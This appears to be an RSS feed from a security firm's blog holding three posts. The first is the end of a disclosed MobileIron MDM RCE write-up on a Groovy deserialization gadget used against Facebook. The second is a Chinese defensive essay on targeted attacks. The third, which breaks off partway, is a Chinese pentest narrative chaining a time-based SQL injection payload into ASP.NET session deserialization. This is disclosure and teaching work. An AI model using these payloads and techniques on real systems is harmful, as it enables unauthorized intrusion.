&lt;p&gt;The approach is fantastic and looks feasible for us. But both gadgets &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ParseClass&lt;/code&gt; are unavailable due to our outdated target libraries. Tomcat introduced the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; since 8.5, but our target is 7. As for the Groovy gadget, the target Groovy version is too old (1.5.6 from 2008) to support the Meta Programming, so we still have to find a new gadget by ourselves. We found a new gadget on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GroovyShell&lt;/code&gt; in the end. If you are interested, you can check the &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Bypass/pull/1&quot;&gt;Pull Request&lt;/a&gt; I sent to the &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Bypass&quot;&gt;JNDI-Injection-Bypass&lt;/a&gt; project!&lt;/p&gt;

&lt;h2 id=&quot;attacking-facebook&quot;&gt;Attacking Facebook&lt;/h2&gt;

&lt;p&gt;Now we have a perfect RCE by chaining JNDI Injection, Tomcat &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GroovyShell&lt;/code&gt;. It’s time to hack Facebook!&lt;/p&gt;

&lt;p&gt;Aforementioned, we knew the Facebook uses MobileIron since 2016. Although the server’s index responses 403 Forbidden now, the Web Service is still accessible!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Everything is ready and wait for our exploit! However, several days before our scheduled attack, we realized that there is a critical problem in our exploit. From &lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;our last time popping shell on Facebook&lt;/a&gt;, we noticed it blocks outbound connections due to security concerns. The outbound connection is vital for JNDI Injection because the idea is to make victims connecting to a malicious server to do further exploitations. But now, we can’t even make an outbound connection, not to mention others.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/5_en.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;So far, all attack surfaces on JNDI Injection have been closed, we have no choice but to return to Hessian deserialization. But due to the lack of available gadgets, we must discover a new one by ourselves!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Before discovering a new gadget, we have to understand the existing gadgets’ root cause properly. After re-reading Moritz Bechler’s &lt;a href=&quot;https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf&quot;&gt;paper&lt;/a&gt;, a certain word interested me:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Cannot restore Groovy’s MethodClosure as readResolve() is called which throws an exception.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;A question quickly came up in my mind: Why did the author leave this word here? Although it failed with exceptions, there must have been something special so that the author write this down.&lt;/p&gt;

&lt;p&gt;Our target is running with a very old Groovy, so we are guessing that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readResolve()&lt;/code&gt; constrain might not have been applied to the code base yet! We compared the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;groovy/runtime/MethodClosure.java&lt;/code&gt; between the latest and 1.5.6.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;diff&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1_5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;MethodClosure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;java&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3_0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;MethodClosure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;java&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;readResolve&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ALLOW_RESOLVE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UnsupportedOperationException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Yes, we are right. There is no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ALLOW_RESOLVE&lt;/code&gt; in Groovy 1.5.6, and we later learned &lt;a href=&quot;https://groovy-lang.org/security.html&quot;&gt;CVE-2015-3253&lt;/a&gt; is just for that. It’s a mitigation for the rising Java deserialization vulnerability in 2015. Since Groovy is an internally used library, developers won’t update it if there is no emergency. The outdated Groovy could also be a good case study to demonstrated how a harmless component can leave you compromised!&lt;/p&gt;

&lt;p&gt;Of course we got the shell on Facebook in the end. Here is the video:&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/hGTLIIOb14A&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h2 id=&quot;vulnerability-report-and-patch&quot;&gt;Vulnerability Report and Patch&lt;/h2&gt;

&lt;p&gt;We have done all the research on March and sent the advisory to MobileIron at 4/3. The MobileIron released the patch on 6/15 and addressed three CVEs for that. You can check the &lt;a href=&quot;https://www.mobileiron.com/en/blog/mobileiron-security-updates-available&quot;&gt;official website&lt;/a&gt; for details!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2020-15505 - Remote Code Execution&lt;/li&gt;
  &lt;li&gt;CVE-2020-15506 - Authentication Bypass&lt;/li&gt;
  &lt;li&gt;CVE-2020-15507 - Arbitrary File Reading&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After the patch has been released, we start monitoring the Internet to track the overall fixing progress. Here we check the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Last-Modified&lt;/code&gt; header on static files so that the result is just for your information. (Unknown stands for the server closed both 443 and 8443 ports)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;At the same time, we keep our attentions on Facebook as well. With 15 days no-patch confirm, we finally popped a shell and report to their Bug Bounty program at 7/2!&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;So far, we have demonstrated a completely unauthenticated RCE on MobileIron. From how we get the firmware, find the vulnerability, and bypass the JNDI mitigation and network limitation. There are other stories, but due to the time, we have just listed topics here for those who are interested:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;How to take over the employees’ devices from MDM&lt;/li&gt;
  &lt;li&gt;Disassemble the MI Protocol&lt;/li&gt;
  &lt;li&gt;And the CVE-2020-15506, an interesting authentication bypass&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I hope this article could draw attention to MDM and the importance of enterprise security! Thanks for reading. :D&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM-en/</link>
                <guid>https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM-en</guid>
                <pubDate>Sat, 12 Sep 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>敵人不是勒贖軟體，而是組織型駭客</title>
                <description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;

&lt;p&gt;駭客攻擊事件一直存在於真實世界，只是鮮少被完整公開揭露。今年國內一些重大關鍵基礎設施 (Critical Information Infrastructure Protection，CIIP) 以及國內的跨國企業紛紛發生嚴重的資安事件，我們想簡單的跟大家談談這些事件背後企業真正需要思考及重視的核心問題。&lt;/p&gt;

&lt;h2 id=&quot;企業面對的是組織型駭客而不只是勒贖軟體&quot;&gt;企業面對的是組織型駭客而不只是勒贖軟體&lt;/h2&gt;

&lt;p&gt;不知道是因為勒贖軟體比較吸睛還是什麼緣故，媒體比較喜歡用勒贖軟體作為標題呈現近年企業面臨的重大威脅。實際上，勒贖軟體只是攻擊過程的工具、加密只是勒贖的手段之一，甚至包含竊取機敏資料。因為這些事件我們沒有參與調查或相關的活動，我們僅就已公開揭露的資料來一窺面對這樣的威脅，企業的具體做法有哪些？&lt;/p&gt;

&lt;p&gt;根據法務部調查局在 iThome 2020 資安大會的&lt;a href=&quot;https://www.ithome.com.tw/news/139331&quot;&gt;分享&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;在這起攻擊事件中，駭客首先從 Web 伺服器、員工電腦等途徑，入侵公司系統長期潛伏及探測，而後竊取帳號權限，進入 AD 伺服器，利用凌晨時段竄改群組派送原則（GPO），同時預埋 lc.tmp 惡意程式到內部伺服器中，等到員工上班打開電腦後，電腦立即套用遭竄改的 GPO，依據指令就會自動將勒索軟體載到記憶體中來執行。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;企業在被勒贖軟體加密後，往往第一時間容易直覺想到防毒軟體或端點防護設備為何沒有生效？現實是，如果企業面對的是針對式的攻擊（Advanced Persistent Threat，APT），攻擊者勢必會研究可以繞過企業的防護或監控的方式。所以企業要思考的應該是一個防禦戰線或更為全面的防護策略，而非仰賴單一的資安設備或服務。&lt;/p&gt;

&lt;p&gt;從上述的敘述，我們可以發現幾個問題：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Web 伺服器具有可利用的漏洞&lt;/strong&gt;，而這個漏洞可能導致主機被取得權限進行後續的橫向移動。造成這個問題的原因可能包含：
    &lt;ul&gt;
      &lt;li&gt;系統從未進行高強度的滲透測試及定期執行弱點掃描&lt;/li&gt;
      &lt;li&gt;屬於老舊無法修補的系統（使用老舊的框架、程式語言）或是廠商已經不再維護&lt;/li&gt;
      &lt;li&gt;一次性的活動網站或測試網站，活動或測試結束後未依照程序下線，成為企業防禦破口&lt;/li&gt;
      &lt;li&gt;不在企業盤點的防護範圍內（如前端未設置 WAF）&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;從員工電腦或是 Web 伺服器可以逐步跳到 AD 伺服器&lt;/strong&gt;，可能存在的問題則包含：
    &lt;ul&gt;
      &lt;li&gt;網路間的區隔不嚴謹，例如未依照資料或系統的重要性進行區隔&lt;/li&gt;
      &lt;li&gt;同網段伺服器間的通訊方式管控不當，沒有開啟或管制重要伺服器的通訊埠或限制來源 IP 位址&lt;/li&gt;
      &lt;li&gt;系統存在可利用取得權限的弱點&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;利用凌晨時段竄改群組派送原則&lt;/strong&gt;：最後是回應機制未即時（包含人員接獲告警後處理不當），企業對於具有集中管理權限的重要系統，例如 AD Server、資產管理軟體等這類型的主機，除了對特權帳號高強度的管理外（如 OTP），也應該針對「異常帳號登入」、「異常帳號新增到群組」、「正常帳號異常登入時間」、「新增排程或 GPO」等行為發出告警；而各種告警也應該依照資產的重要性訂定不同的 SLA 回應與處理。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;你需要更全面目標導向的方式思考企業資安現況&quot;&gt;你需要更全面、目標導向的方式思考企業資安現況&lt;/h2&gt;

&lt;p&gt;我們在近三年的紅隊演練，以企業對其營運最關鍵的資訊資產作為演練標的，並模擬組織型駭客的攻擊模式，透過外部情搜、取得外部系統權限、橫向移動、持續取得更多內部伺服器權限及提權、破解密碼，最終達到企業指定的關鍵資產執行演練情境。而企業透過高強度且精準的演練過程，除了明確掌握可被入侵的路徑外，更得以檢視上述問題的不足並持續改善。&lt;/p&gt;

&lt;p&gt;我們認為，只要你的企業夠重要（對駭客而言重要，而不是自己覺得重要），組織型的攻擊就不會停歇！企業唯有不斷的找出自己不足之處，持續提升自己的防禦強度才是能真正降低風險的正確作法。&lt;/p&gt;

&lt;p&gt;至於「第三方供應鏈安全」及「如何更完整的制定資安策略」，我們將找時間另外跟大家說明。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2020/08/21/the-enemy-is-not-ransomware-its-nation-state-hackers/</link>
                <guid>https://devco.re/blog/2020/08/21/the-enemy-is-not-ransomware-its-nation-state-hackers</guid>
                <pubDate>Fri, 21 Aug 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>從 SQL 到 RCE: 利用 SessionState 反序列化攻擊 ASP.NET 網站應用程式</title>
                <description>&lt;p&gt;今日來聊聊在去年某次滲透測試過中發現的趣事，那是在一個風和日麗的下午，與往常一樣進行著枯燥的測試環節，對每個參數嘗試各種可能的注入，但遲遲沒有任何進展和突破，直到在某個頁面上注入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?id=1; waitfor delay &apos;00:00:05&apos;--&lt;/code&gt;，然後他就卡住了，過了恰好 5 秒鐘後伺服器又有回應，這表示我們找到一個 SQL Server 上的 SQL Injection！&lt;/p&gt;

&lt;p&gt;一些陳舊、龐大的系統中，因為一些複雜的因素，往往仍使用著 sa 帳戶來登入 SQL Server，而在有如此高權限的資料庫帳戶前提下，我們可以輕易利用 xp_cmdshell 來執行系統指令以取得資料庫伺服器的作業系統控制權，但假如故事有如此順利，就不會出現這篇文章，所以理所當然我們取得的資料庫帳戶並沒有足夠權限。但因為發現的 SQL Injection 是 Stacked based，我們仍然可以對資料表做 CRUD，運氣好控制到一些網站設定變數的話，甚至可以直接達成 RCE，所以還是試著 dump schema 以了解架構，而在 dump 過程中發現了一個有趣的資料庫：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Database: ASPState
[2 tables]
+---------------------------------------+
| dbo.ASPStateTempApplications          |
| dbo.ASPStateTempSessions              |
+---------------------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;閱讀文件後了解到，這個資料庫的存在用途是用來保存 ASP.NET 網站應用程式的 session。一般情況下預設 session 是儲存在 ASP.NET 網站應用程式的記憶體中，但某些分散式架構（例如 Load Balance 架構）的情況下，同時會有多個一模一樣的 ASP.NET 網站應用程式運行在不同伺服器主機上，而使用者每次請求時被分配到的伺服器主機也不會完全一致，就會需要有可以讓多個主機共享 session 的機制，而儲存在 SQL Server 上就是一種解決方案之一，想啟用這個機制可以在 web.config 中添加如下設定：&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;system.web&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- 將 session 保存在 SQL Server 中。 --&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;sessionState&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;mode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SQLServer&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;sqlConnectionString=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;data source=127.0.0.1;user id=&amp;lt;username&amp;gt;;password=&amp;lt;password&amp;gt;&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;timeout=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;20&quot;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
        
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- 預設值，將 session 保存在記憶體中。 --&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- &amp;lt;sessionState mode=&quot;InProc&quot; timeout=&quot;20&quot; /&amp;gt; --&amp;gt;&lt;/span&gt;
 
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- 將 session 保存在 ASP.NET State Service 中，
             另一種跨主機共享 session 的解決方案。 --&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!--
        &amp;lt;sessionState
            mode=&quot;StateServer&quot;
            stateConnectionString=&quot;tcpip=localhost:42424&quot;
            timeout=&quot;20&quot;
        /&amp;gt;
        --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/system.web&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;而要在資料庫中建立 ASPState 的資料庫，可以利用內建的工具 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_regsql.exe&lt;/code&gt; 完成這個任務，只需要使用下述指令即可：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 建立 ASPState 資料庫&lt;/span&gt;
aspnet_regsql.exe &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; 127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; sa &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; password &lt;span class=&quot;nt&quot;&gt;-ssadd&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sstype&lt;/span&gt; p

&lt;span class=&quot;c&quot;&gt;# 移除 ASPState 資料庫&lt;/span&gt;
aspnet_regsql.exe &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; 127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; sa &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; password &lt;span class=&quot;nt&quot;&gt;-ssremove&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sstype&lt;/span&gt; p
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;現在我們了解如何設定 session 的儲存位置，且又可以控制 ASPState 資料庫，可以做到些什麼呢？這就是文章標題的重點，取得 Remote Code Execution！&lt;/p&gt;

&lt;p&gt;ASP.NET 允許我們在 session 中儲存一些物件，例如儲存一個 List 物件：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Session[&quot;secret&quot;] = new List&amp;lt;String&amp;gt;() { &quot;secret string&quot; };&lt;/code&gt;，對於如何將這些物件保存到 SQL Server 上，理所當然地使用了&lt;strong&gt;序列化機制&lt;/strong&gt;來處理，而我們又控制了資料庫，所以也能執行任意反序列化，為此需要先了解 Session 物件序列化與反序列化的過程。&lt;/p&gt;

&lt;p&gt;簡單閱讀程式碼後，很快就可以定位出處理相關過程的類別，為了縮減說明的篇幅，以下將直接切入重點說明從資料庫取出資料後進行了什麼樣的反序列化操作。核心主要是透過呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SqlSessionStateStore.GetItem&lt;/code&gt; 函式還原出 Session 物件，雖然已盡可能把無關緊要的程式碼移除，但行數還是偏多，如果懶得閱讀程式碼的朋友可以直接下拉繼續看文章說明 XD&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Web.SessionState&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SqlSessionStateStore&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateStoreProviderBase&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;GetItem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;locked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TimeSpan&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockAge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateActions&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actionFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SessionIDManager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;CheckIdLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* throwOnFail */&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DoGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;locked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockAge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actionFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DoGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getExclusive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;locked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TimeSpan&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockAge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateActions&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actionFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SqlDataReader&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;MemoryStream&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
